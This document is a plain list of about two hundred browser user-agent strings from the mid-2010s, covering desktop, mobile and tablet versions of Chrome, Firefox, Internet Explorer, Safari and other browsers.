Mozilla/5.0 (Linux; Android 5.1.1; Nexus 9 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-T330NU Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1
Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MALCJS; rv:11.0) like Gecko
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/8.0.57838 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; yie10; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/8.0; TNJB; 1ButtonTaskbar)
Mozilla/5.0 (Linux; Android 4.4.2; RCT6773W22 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP08; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-T210R Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.18.US Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SM-T350 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0; 1ButtonTaskbar)
Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG-SM-G920A Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MAAU; MAAU; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MANM; MANM; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; QTAQZ3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 OverDrive Media Console/3.3.1
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257
Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/7.0.55539 Mobile/11D201 Safari/9537.53
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4
Mozilla/5.0 (Windows NT 5.1; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (iPad;U;CPU OS 5_1_1 like Mac OS X; zh-cn)AppleWebKit/534.46.0(KHTML, like Gecko)CriOS/19.0.1084.60 Mobile/9B206 Safari/7534.48.3
Mozilla/5.0 (Linux; Android 4.4.3; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/11D201 Safari/9537.53
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAMIJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; VS985 4G Build/LRX21Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 5.1; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020b Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.3; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; WOW64; Trident/6.0)
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; MS-RTC LM 8)
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/32.0
Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; SM-T110 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910T Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/7.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36
Mozilla/5.0 (X11; CrOS armv7l 6946.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0 SeaMonkey/2.35
Mozilla/5.0 (Linux; Android 4.4.2; SM-T330NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A8426 Safari/8536.25
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; LG-V410 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 TheWorld 6
Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12B410 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0 Safari/600.1.25
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; EIE10;ENUSWOL)
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; ATT; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; EIE10;ENUSMSN; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MATBJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LGMS323 Build/KOT49I.MS32310c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE11;ENUSMSN; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/30.0.1599.114 Safari/537.36 Puffin/4.5.0IT
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie8; rv:11.0) like Gecko
Mozilla/5.0 (Linux; U; Android 4.4.3; en-gb; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; FunWebProducts; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2505.0 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; Touch; WebView/1.0)
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SPH-L720 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; yie9; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (compatible; Windows NT 6.1; Catchpoint) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; Z970 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10
Mozilla/5.0 (X11; CrOS armv7l 6812.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.153 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36
